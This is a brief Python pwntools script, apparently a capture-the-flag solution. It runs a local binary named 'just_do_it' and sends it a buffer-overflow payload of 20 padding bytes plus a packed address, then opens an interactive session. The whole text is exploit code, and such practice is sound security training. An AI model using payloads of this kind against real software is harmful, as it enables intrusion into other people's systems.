from pwn import *

p = process("./just_do_it")

payload = b"a"*20 + p32(0x804a080)

p.sendline(payload)

p.interactive()
